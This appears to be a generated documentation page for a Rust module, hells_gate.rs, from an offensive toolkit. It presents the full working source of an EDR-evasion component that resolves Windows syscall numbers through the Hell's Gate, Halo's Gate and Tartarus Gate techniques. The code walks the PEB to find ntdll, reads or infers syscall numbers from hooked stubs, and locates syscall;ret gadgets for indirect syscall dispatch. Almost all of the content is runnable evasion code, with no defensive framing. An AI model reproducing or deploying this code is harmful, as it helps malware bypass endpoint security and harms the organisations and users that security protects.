# crowd -- hells_gate.rs  (GOD TIER -- Gate Cascade SSN Resolution)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/hells_gate.rs` |
| **Lines** | 609 |
| **Tier** | S |
| **Cards** | T003-hells-gate |
| **Role** | Hells/Halos/Tartarus Gate SSN resolution |
| **Inline ASM** | Yes |
| **Unsafe blocks** | 23 |

## Purpose

# crowd -- hells_gate.rs  (GOD TIER -- Gate Cascade SSN Resolution)

## Hell's Gate / Halo's Gate / Tartarus Gate

Three-stage SSN resolution that handles EDR-hooked ntdll stubs.

### Hell's Gate (Stage 1)
Read the ntdll syscall stub in memory. If the first bytes match the
canonical pattern `4C 8B D1 B8 XX XX 00 00` (mov r10,rcx / mov eax,SSN),
the stub is clean -- extract the SSN directly from bytes [4..6].

### Halo's Gate (Stage 2)
If the target stub IS hooked (first byte is `0xE9` = JMP), walk UP and
DOWN to neighboring syscall stubs in the export table. Since SSNs are
assigned sequentially by RVA order, a clean neighbor at distance `d`
gives us: `target_SSN = neighbor_SSN +/- d`.

### Tartarus Gate (Stage 3)
If the environment is heavily hooked and even neighbors are patched,
enumerate ALL Nt* exports, sort by RVA (which matches SSN assignment
order), and assign SSNs sequentially: the function at sorted index 0
gets SSN 0, index 1 gets SSN 1, etc.

## Usage
```rust
// Single function
let (ssn, stub_addr) = unsafe { hells_gate::resolve_ssn("NtAllocateVirtualMemory")? };

// All Nt* functions at once
let map = unsafe { hells_gate::resolve_all()? };
```

## Constants

- `NTDLL_HASH`: `u32` = `0x1edab0ed`
- `HALOS_MAX_DISTANCE`: `usize` = `20`
- `CLEAN_STUB_PREFIX`: `[u8; 4]` = `[0x4C, 0x8B, 0xD1, 0xB8]`
- `JMP_REL32`: `u8` = `0xE9`
- `EXPORT_DIR_OFFSET`: `usize` = `0x88`
- `EXCEPTION_DIR_OFFSET`: `usize` = `0xA0`
- `EXCEPTION_DIR_SIZE_OFFSET`: `usize` = `0xA4`

## Types

### struct `RuntimeFunctionEntry` (line 68)

## Public API

### `is_hooked` `unsafe` (line 251)
```rust
pub unsafe fn is_hooked(addr: *const u8) -> bool
```
Check if a specific ntdll stub is hooked.
A stub is considered hooked if its first byte is `0xE9` (JMP rel32),
which is the canonical EDR inline hook trampoline.

### `resolve_ssn` `unsafe` (line 434)
```rust
pub unsafe fn resolve_ssn(func_name: &str) -> anyhow::Result<(u16, usize)>
```
Resolve SSN for a syscall by name using the Gate cascade.

1. **Hell's Gate**: try to read SSN directly from the stub.
2. **Halo's Gate**: if hooked, walk neighbors +/-1..20.
3. **Tartarus Gate**: if neighbors are also hooked, use exception directory ordering.

Returns `(ssn, stub_address)` where `stub_address` is the address of the
`syscall; ret` gadget inside ntdll (for use with indirect syscall dispatch).

### `resolve_all` `unsafe` (line 496)
```rust
pub unsafe fn resolve_all() -> anyhow::Result<HashMap<String, (u16, usize)>>
```
Resolve all Nt* syscalls and return a HashMap<String, (u16, usize)>.

Uses the Gate cascade for each function. Functions that fail all three
gates are silently omitted from the result.

## Internal Functions

- `djb2_hash` (line 77)
- `find_ntdll_base` (unsafe) (line 88)
- `find_ntdll_base` (unsafe) (line 140)
- `parse_exports` (unsafe) (line 149)
- `parse_exports` (unsafe) (line 209)
- `read_ssn_from_stub` (unsafe) (line 219)
- `read_ssn_from_stub` (unsafe) (line 244)
- `halos_gate` (unsafe) (line 267)
- `halos_gate` (unsafe) (line 300)
- `tartarus_gate` (unsafe) (line 321)
- `tartarus_gate` (unsafe) (line 384)
- `find_syscall_ret_gadget` (unsafe) (line 393)
- `find_syscall_ret_gadget` (unsafe) (line 406)
- `get_image_end` (unsafe) (line 412)
- `get_image_end` (unsafe) (line 420)
- `find_gadget_near` (unsafe) (line 557)
- `find_gadget_near` (unsafe) (line 580)
- `find_any_gadget` (unsafe) (line 592)
- `find_any_gadget` (unsafe) (line 604)

## Full Source

```rust
//! # crowd -- hells_gate.rs  (GOD TIER -- Gate Cascade SSN Resolution)
//!
//! ## Hell's Gate / Halo's Gate / Tartarus Gate
//!
//! Three-stage SSN resolution that handles EDR-hooked ntdll stubs.
//!
//! ### Hell's Gate (Stage 1)
//! Read the ntdll syscall stub in memory. If the first bytes match the
//! canonical pattern `4C 8B D1 B8 XX XX 00 00` (mov r10,rcx / mov eax,SSN),
//! the stub is clean -- extract the SSN directly from bytes [4..6].
//!
//! ### Halo's Gate (Stage 2)
//! If the target stub IS hooked (first byte is `0xE9` = JMP), walk UP and
//! DOWN to neighboring syscall stubs in the export table. Since SSNs are
//! assigned sequentially by RVA order, a clean neighbor at distance `d`
//! gives us: `target_SSN = neighbor_SSN +/- d`.
//!
//! ### Tartarus Gate (Stage 3)
//! If the environment is heavily hooked and even neighbors are patched,
//! enumerate ALL Nt* exports, sort by RVA (which matches SSN assignment
//! order), and assign SSNs sequentially: the function at sorted index 0
//! gets SSN 0, index 1 gets SSN 1, etc.
//!
//! ## Usage
//! ```rust
//! // Single function
//! let (ssn, stub_addr) = unsafe { hells_gate::resolve_ssn("NtAllocateVirtualMemory")? };
//!
//! // All Nt* functions at once
//! let map = unsafe { hells_gate::resolve_all()? };
//! ```

#![allow(dead_code, non_snake_case)]

use std::collections::HashMap;

// ---- Constants ----------------------------------------------------------------

/// DJB2 hash of "ntdll.dll" (lowercase) -- used to locate ntdll in PEB.
const NTDLL_HASH: u32 = 0x1edab0ed;

/// Maximum neighbor distance for Halo's Gate scanning.
const HALOS_MAX_DISTANCE: usize = 20;

/// Clean 64-bit syscall stub prefix:
///   4C 8B D1  mov r10, rcx
///   B8        mov eax, imm32
const CLEAN_STUB_PREFIX: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8];

/// JMP rel32 opcode -- indicates an EDR hook trampoline.
const JMP_REL32: u8 = 0xE9;

// ---- PE structure offsets (x86_64) --------------------------------------------

/// Offset from NT headers to the Export Directory RVA (DataDirectory[0]).
const EXPORT_DIR_OFFSET: usize = 0x88;

/// Offset from NT headers to the Exception Directory RVA (DataDirectory[3]).
const EXCEPTION_DIR_OFFSET: usize = 0xA0;

/// Offset from NT headers to the Exception Directory size.
const EXCEPTION_DIR_SIZE_OFFSET: usize = 0xA4;

// ---- IMAGE_RUNTIME_FUNCTION_ENTRY (x64 exception table) -----------------------

#[cfg(target_arch = "x86_64")]
#[repr(C)]
struct RuntimeFunctionEntry {
    begin_address: u32,
    end_address: u32,
    unwind_info_address: u32,
}

// ---- DJB2 hash ----------------------------------------------------------------

#[inline(always)]
fn djb2_hash(s: &str) -> u32 {
    let mut hash: u32 = 5381;
    for &b in s.as_bytes() {
        hash = ((hash << 5).wrapping_add(hash)).wrapping_add(b as u32);
    }
    hash
}

// ---- PEB walker: find ntdll base address --------------------------------------

#[cfg(target_arch = "x86_64")]
unsafe fn find_ntdll_base() -> *const u8 {
    // Read PEB from GS:[0x60]
    let peb: u64;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        lateout(reg) peb,
        options(nostack, readonly, pure)
    );
    if peb == 0 { return core::ptr::null(); }

    // PEB.Ldr is at offset 0x18 on x64
    let ldr = *((peb as usize + 0x18) as *const usize);
    if ldr == 0 { return core::ptr::null(); }

    // InMemoryOrderModuleList is at Ldr+0x20
    let list_head = (ldr + 0x20) as *const usize;
    let mut entry = *list_head as *const u8;
    let head = list_head as *const u8;

    while entry != head {
        // LDR_DATA_TABLE_ENTRY: InMemoryOrderLinks is at the start (when accessed
        // through InMemoryOrderModuleList). DllBase is at offset 0x20 from the
        // start of the entry (0x10 from the list link).
        // BaseDllName UNICODE_STRING is at offset 0x48 from entry start (0x38 from link).
        let dll_base = *((entry as usize + 0x20) as *const *const u8);
        let name_len = *((entry as usize + 0x48) as *const u16);
        let name_buf = *((entry as usize + 0x48 + 0x08) as *const *const u16);

        if name_len > 0 && !name_buf.is_null() {
            let wchar_count = (name_len / 2) as usize;
            let slice = core::slice::from_raw_parts(name_buf, wchar_count);

            // Hash as lowercase for case-insensitive match
            let mut hash: u32 = 5381;
            for &wc in slice {
                let lower = (wc | 0x20) as u8;
                hash = ((hash << 5).wrapping_add(hash)).wrapping_add(lower as u32);
            }

            if hash == NTDLL_HASH {
                return dll_base;
            }
        }

        // Follow Flink
        entry = *(entry as *const *const u8);
    }

    core::ptr::null()
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn find_ntdll_base() -> *const u8 {
    core::ptr::null()
}

// ---- PE export parser ---------------------------------------------------------

/// Parse the PE export directory and return all Nt* (not Ntdll*) exports
/// sorted by their RVA (address). Returns (name, VA pointer) pairs.
#[cfg(target_arch = "x86_64")]
unsafe fn parse_exports(base: *const u8) -> Vec<(String, *const u8)> {
    let mut result = Vec::new();
    if base.is_null() { return result; }

    // Validate MZ signature
    if *(base as *const u16) != 0x5A4D { return result; }

    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);

    // Validate PE signature
    if *(nt as *const u32) != 0x4550 { return result; }

    let export_rva = *(nt.add(EXPORT_DIR_OFFSET) as *const u32) as usize;
    if export_rva == 0 { return result; }

    let exp = base.add(export_rva);
    let n_names = *(exp.add(24) as *const u32) as usize;       // NumberOfNames
    let names_rva = *(exp.add(32) as *const u32) as usize;     // AddressOfNames
    let ords_rva = *(exp.add(36) as *const u32) as usize;      // AddressOfNameOrdinals
    let funcs_rva = *(exp.add(28) as *const u32) as usize;     // AddressOfFunctions

    let names = base.add(names_rva) as *const u32;
    let ords = base.add(ords_rva) as *const u16;
    let funcs = base.add(funcs_rva) as *const u32;

    for i in 0..n_names {
        let name_rva = *names.add(i) as usize;
        let cstr = base.add(name_rva);

        // Read null-terminated ASCII name
        let mut len = 0usize;
        while *cstr.add(len) != 0 { len += 1; }
        let slice = core::slice::from_raw_parts(cstr, len);

        // Filter: starts with "Nt" but NOT "Ntdll"
        if len >= 3
            && slice[0] == b'N'
            && slice[1] == b't'
            && !(len >= 5
                && slice[2] == b'd'
                && slice[3] == b'l'
                && slice[4] == b'l')
        {
            let ordinal = *ords.add(i) as usize;
            let func_rva = *funcs.add(ordinal) as usize;
            let func_va = base.add(func_rva);

            // Convert to String
            let name = core::str::from_utf8_unchecked(slice).to_string();
            result.push((name, func_va));
        }
    }

    // Sort by address (RVA order) -- this is the SSN assignment order
    result.sort_by_key(|&(_, addr)| addr as usize);
    result
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn parse_exports(_base: *const u8) -> Vec<(String, *const u8)> {
    Vec::new()
}

// ---- Stub inspection ----------------------------------------------------------

/// Read the SSN directly from a clean (unhooked) syscall stub.
/// Expected pattern: `4C 8B D1 B8 [SSN_LO] [SSN_HI] 00 00`
/// Returns `Some(ssn)` if the stub matches, `None` if hooked or unrecognizable.
#[cfg(target_arch = "x86_64")]
unsafe fn read_ssn_from_stub(addr: *const u8) -> Option<u16> {
    if addr.is_null() { return None; }

    // Check the 4-byte prefix: 4C 8B D1 B8
    if *addr       != CLEAN_STUB_PREFIX[0]
        || *addr.add(1) != CLEAN_STUB_PREFIX[1]
        || *addr.add(2) != CLEAN_STUB_PREFIX[2]
        || *addr.add(3) != CLEAN_STUB_PREFIX[3]
    {
        return None;
    }

    // Verify the high 2 bytes of the immediate are 00 00
    // (SSNs are always < 0x10000 in practice)
    if *addr.add(6) != 0x00 || *addr.add(7) != 0x00 {
        return None;
    }

    // Extract the 16-bit SSN from bytes [4..6]
    let ssn_lo = *addr.add(4) as u16;
    let ssn_hi = *addr.add(5) as u16;
    Some(ssn_lo | (ssn_hi << 8))
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn read_ssn_from_stub(_addr: *const u8) -> Option<u16> {
    None
}

/// Check if a specific ntdll stub is hooked.
/// A stub is considered hooked if its first byte is `0xE9` (JMP rel32),
/// which is the canonical EDR inline hook trampoline.
pub unsafe fn is_hooked(addr: *const u8) -> bool {
    if addr.is_null() { return false; }
    *addr == JMP_REL32
}

// ---- Halo's Gate: neighbor walk -----------------------------------------------

/// Walk neighboring syscall stubs (up and down by index) to find a clean one.
/// Once found, compute the target SSN by offset arithmetic.
///
/// `addr`    - address of the target (hooked) stub
/// `exports` - all Nt* exports sorted by address
/// `idx`     - index of the target function in `exports`
///
/// Returns `Some(ssn)` if a clean neighbor was found, `None` otherwise.
#[cfg(target_arch = "x86_64")]
unsafe fn halos_gate(
    _addr: *const u8,
    exports: &[(String, *const u8)],
    idx: usize,
) -> Option<u16> {
    let count = exports.len();

    for distance in 1..=HALOS_MAX_DISTANCE {
        // Walk DOWN (higher index = higher SSN)
        if idx + distance < count {
            let neighbor_addr = exports[idx + distance].1;
            if let Some(neighbor_ssn) = read_ssn_from_stub(neighbor_addr) {
                // target_SSN = neighbor_SSN - distance
                if neighbor_ssn >= distance as u16 {
                    return Some(neighbor_ssn - distance as u16);
                }
            }
        }

        // Walk UP (lower index = lower SSN)
        if idx >= distance {
            let neighbor_addr = exports[idx - distance].1;
            if let Some(neighbor_ssn) = read_ssn_from_stub(neighbor_addr) {
                // target_SSN = neighbor_SSN + distance
                return Some(neighbor_ssn + distance as u16);
            }
        }
    }

    None
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn halos_gate(
    _addr: *const u8,
    _exports: &[(String, *const u8)],
    _idx: usize,
) -> Option<u16> {
    None
}

// ---- Tartarus Gate: exception directory enumeration ---------------------------

/// Last resort: use the Exception Directory (IMAGE_DIRECTORY_ENTRY_EXCEPTION)
/// combined with the Export Address Table to enumerate all Nt* functions
/// and assign SSNs purely by sorted RVA order.
///
/// The Exception Directory contains RUNTIME_FUNCTION entries for every function
/// with unwind data. By cross-referencing these with the export table, we can
/// verify which exports are actual function entry points and assign SSNs
/// in RVA order without reading any potentially-hooked stub bytes.
///
/// Returns a complete map of (name -> SSN) for all Nt* exports.
#[cfg(target_arch = "x86_64")]
unsafe fn tartarus_gate(base: *const u8) -> HashMap<String, u16> {
    let mut result = HashMap::new();
    if base.is_null() { return result; }

    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);

    // Read Exception Directory
    let exc_rva = *(nt.add(EXCEPTION_DIR_OFFSET) as *const u32) as usize;
    let exc_size = *(nt.add(EXCEPTION_DIR_SIZE_OFFSET) as *const u32) as usize;

    if exc_rva == 0 || exc_size == 0 {
        // No exception directory -- fall back to pure RVA ordering
        // (same as parse_exports sorted order = SSN order)
        let exports = parse_exports(base);
        for (i, (name, _)) in exports.iter().enumerate() {
            result.insert(name.clone(), i as u16);
        }
        return result;
    }

    let exc_base = base.add(exc_rva) as *const RuntimeFunctionEntry;
    let entry_count = exc_size / core::mem::size_of::<RuntimeFunctionEntry>();

    // Build a set of valid function entry RVAs from the exception directory
    let mut exc_entries: std::collections::HashSet<u32> =
        std::collections::HashSet::with_capacity(entry_count);
    for i in 0..entry_count {
        let entry = &*exc_base.add(i);
        exc_entries.insert(entry.begin_address);
    }

    // Get all Nt* exports sorted by RVA
    let exports = parse_exports(base);

    // Filter to only functions that have an exception directory entry
    // (this validates they are real function entry points, not data exports)
    let mut validated: Vec<&(String, *const u8)> = Vec::with_capacity(exports.len());
    for exp in &exports {
        let rva = (exp.1 as usize) - (base as usize);
        if exc_entries.contains(&(rva as u32)) {
            validated.push(exp);
        }
    }

    // If the exception directory filter removed everything (unexpected),
    // fall back to the unfiltered list
    if validated.is_empty() {
        for (i, (name, _)) in exports.iter().enumerate() {
            result.insert(name.clone(), i as u16);
        }
        return result;
    }

    // Already sorted by RVA (parse_exports sorts). Assign SSNs sequentially.
    for (i, (name, _)) in validated.iter().enumerate() {
        result.insert(name.to_string(), i as u16);
    }

    result
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn tartarus_gate(_base: *const u8) -> HashMap<String, u16> {
    HashMap::new()
}

// ---- syscall / ret gadget finder ----------------------------------------------

/// Scan forward from `addr` to find the `syscall; ret` gadget (0F 05 C3).
/// Returns the address of the `0F 05` instruction, or 0 if not found.
#[cfg(target_arch = "x86_64")]
unsafe fn find_syscall_ret_gadget(addr: *const u8, image_end: *const u8) -> usize {
    // Scan up to 64 bytes forward (covers all known stub layouts)
    for off in 0..64usize {
        let p = addr.add(off);
        if (p.add(2) as usize) >= (image_end as usize) { break; }
        if *p == 0x0F && *p.add(1) == 0x05 && *p.add(2) == 0xC3 {
            return p as usize;
        }
    }
    0
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn find_syscall_ret_gadget(_addr: *const u8, _image_end: *const u8) -> usize {
    0
}

/// Get the end-of-image address from the PE optional header SizeOfImage.
#[cfg(target_arch = "x86_64")]
unsafe fn get_image_end(base: *const u8) -> *const u8 {
    let e_lfanew = *(base.add(0x3C) as *const u32) as usize;
    let nt = base.add(e_lfanew);
    let size_of_image = *(nt.add(0x50) as *const u32) as usize;
    base.add(size_of_image)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn get_image_end(base: *const u8) -> *const u8 {
    base
}

// ---- Public API ---------------------------------------------------------------

/// Resolve SSN for a syscall by name using the Gate cascade.
///
/// 1. **Hell's Gate**: try to read SSN directly from the stub.
/// 2. **Halo's Gate**: if hooked, walk neighbors +/-1..20.
/// 3. **Tartarus Gate**: if neighbors are also hooked, use exception directory ordering.
///
/// Returns `(ssn, stub_address)` where `stub_address` is the address of the
/// `syscall; ret` gadget inside ntdll (for use with indirect syscall dispatch).
pub unsafe fn resolve_ssn(func_name: &str) -> anyhow::Result<(u16, usize)> {
    let base = find_ntdll_base();
    if base.is_null() {
        return Err(anyhow::anyhow!("hells_gate: failed to locate ntdll base via PEB"));
    }

    let image_end = get_image_end(base);
    let exports = parse_exports(base);

    if exports.is_empty() {
        return Err(anyhow::anyhow!("hells_gate: no Nt* exports found in ntdll"));
    }

    // Find the target function in the sorted export list
    let target_idx = exports.iter().position(|(name, _)| name == func_name);
    let target_idx = match target_idx {
        Some(idx) => idx,
        None => {
            return Err(anyhow::anyhow!(
                "hells_gate: function '{}' not found in ntdll exports",
                func_name
            ));
        }
    };

    let (_, target_addr) = exports[target_idx];

    // Stage 1: Hell's Gate -- direct read from clean stub
    if let Some(ssn) = read_ssn_from_stub(target_addr) {
        let gadget = find_syscall_ret_gadget(target_addr, image_end);
        if gadget != 0 {
            return Ok((ssn, gadget));
        }
        // Stub is clean but gadget not found nearby -- try a neighbor's gadget
        let gadget = find_any_gadget(&exports, image_end);
        return Ok((ssn, gadget));
    }

    // Stage 2: Halo's Gate -- neighbor walk
    if let Some(ssn) = halos_gate(target_addr, &exports, target_idx) {
        // Find a clean gadget from any neighbor
        let gadget = find_gadget_near(target_addr, &exports, target_idx, image_end);
        return Ok((ssn, gadget));
    }

    // Stage 3: Tartarus Gate -- exception directory enumeration
    let tartarus_map = tartarus_gate(base);
    if let Some(&ssn) = tartarus_map.get(func_name) {
        let gadget = find_any_gadget(&exports, image_end);
        return Ok((ssn, gadget));
    }

    Err(anyhow::anyhow!(
        "hells_gate: all gates failed for '{}' -- stub may be completely destroyed",
        func_name
    ))
}

/// Resolve all Nt* syscalls and return a HashMap<String, (u16, usize)>.
///
/// Uses the Gate cascade for each function. Functions that fail all three
/// gates are silently omitted from the result.
pub unsafe fn resolve_all() -> anyhow::Result<HashMap<String, (u16, usize)>> {
    let base = find_ntdll_base();
    if base.is_null() {
        return Err(anyhow::anyhow!("hells_gate: failed to locate ntdll base via PEB"));
    }

    let image_end = get_image_end(base);
    let exports = parse_exports(base);

    if exports.is_empty() {
        return Err(anyhow::anyhow!("hells_gate: no Nt* exports found in ntdll"));
    }

    let mut result: HashMap<String, (u16, usize)> = HashMap::with_capacity(exports.len());

    // First pass: Hell's Gate on every export
    let mut unresolved: Vec<usize> = Vec::new();

    for (idx, (name, addr)) in exports.iter().enumerate() {
        if let Some(ssn) = read_ssn_from_stub(*addr) {
            let gadget = find_syscall_ret_gadget(*addr, image_end);
            result.insert(name.clone(), (ssn, gadget));
        } else {
            unresolved.push(idx);
        }
    }

    // Second pass: Halo's Gate on unresolved
    let mut still_unresolved: Vec<usize> = Vec::new();

    for &idx in &unresolved {
        let (ref name, addr) = exports[idx];
        if let Some(ssn) = halos_gate(addr, &exports, idx) {
            let gadget = find_gadget_near(addr, &exports, idx, image_end);
            result.insert(name.clone(), (ssn, gadget));
        } else {
            still_unresolved.push(idx);
        }
    }

    // Third pass: Tartarus Gate for anything still unresolved
    if !still_unresolved.is_empty() {
        let tartarus_map = tartarus_gate(base);
        let any_gadget = find_any_gadget(&exports, image_end);

        for &idx in &still_unresolved {
            let (ref name, _) = exports[idx];
            if let Some(&ssn) = tartarus_map.get(name.as_str()) {
                result.insert(name.clone(), (ssn, any_gadget));
            }
        }
    }

    Ok(result)
}

// ---- Gadget helpers -----------------------------------------------------------

/// Find a `syscall; ret` gadget from a nearby clean stub.
/// Used when the target stub itself is hooked.
#[cfg(target_arch = "x86_64")]
unsafe fn find_gadget_near(
    _target_addr: *const u8,
    exports: &[(String, *const u8)],
    idx: usize,
    image_end: *const u8,
) -> usize {
    // Check neighbors for a clean stub with a gadget
    let count = exports.len();
    for distance in 1..=HALOS_MAX_DISTANCE {
        if idx + distance < count {
            let gadget = find_syscall_ret_gadget(exports[idx + distance].1, image_end);
            if gadget != 0 { return gadget; }
        }
        if idx >= distance {
            let gadget = find_syscall_ret_gadget(exports[idx - distance].1, image_end);
            if gadget != 0 { return gadget; }
        }
    }
    // Last resort: scan all exports
    find_any_gadget(exports, image_end)
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn find_gadget_near(
    _target_addr: *const u8,
    _exports: &[(String, *const u8)],
    _idx: usize,
    _image_end: *const u8,
) -> usize {
    0
}

/// Find ANY `syscall; ret` gadget from the export list.
/// Scans all Nt* stubs until one with a valid gadget is found.
#[cfg(target_arch = "x86_64")]
unsafe fn find_any_gadget(
    exports: &[(String, *const u8)],
    image_end: *const u8,
) -> usize {
    for (_, addr) in exports {
        let gadget = find_syscall_ret_gadget(*addr, image_end);
        if gadget != 0 { return gadget; }
    }
    0
}

#[cfg(not(target_arch = "x86_64"))]
unsafe fn find_any_gadget(
    _exports: &[(String, *const u8)],
    _image_end: *const u8,
) -> usize {
    0
}

```